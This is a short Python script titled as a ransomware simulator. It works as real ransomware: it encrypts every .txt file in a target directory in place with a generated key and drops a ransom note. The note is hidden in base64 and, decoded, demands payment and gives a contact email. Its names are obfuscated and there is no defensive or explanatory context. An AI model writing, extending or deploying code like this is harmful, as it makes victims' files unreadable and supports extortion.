# real_ransomware_simulator.py
import os as o
import base64 as b
import time as t
from cryptography.fernet import Fernet as F

# --- Config ---
_D = "./target_dir"  # Target directory
_K = "secret.key"       # Key storage

# --- Functions ---
def _g():
    _k = F.generate_key()
    with open(_K, "wb") as f:
        f.write(_k)

def _l():
    return open(_K, "rb").read()

def _e(fpath, fernet):
    with open(fpath, "rb") as f:
        d = f.read()
    e = fernet.encrypt(d)
    with open(fpath, "wb") as f:
        f.write(e)

def _n():
    msg = b.b64decode(b"WFhZIFlPVVIgRklMRVMgSEFWRSBCRUVOIEVOQ1JZUFRFRCEKVG8gcmVjb3ZlciB5b3VyIGZpbGVzLCB5b3UgbXVzdCBwYXkgdGhlIHJhbnNvbS4KQ29udGFjdCBtdWhhbW1hZGhheXlhbjAwMEBnbWFpbC5jb20gZm9yIGluc3RydWN0aW9ucy4K==")
    with open(o.path.join(_D, "RESTORE_FILES.txt"), "wb") as f:
        f.write(msg)

def _m():
    if not o.path.exists(_K):
        _g()

    k = _l()
    fernet = F(k)

    for fn in o.listdir(_D):
        fp = o.path.join(_D, fn)
        if o.path.isfile(fp) and fn.endswith(".txt"):
            _e(fp, fernet)

    _n()

if __name__ == "__main__":
    t.sleep(2)  # slight delay
    _m()
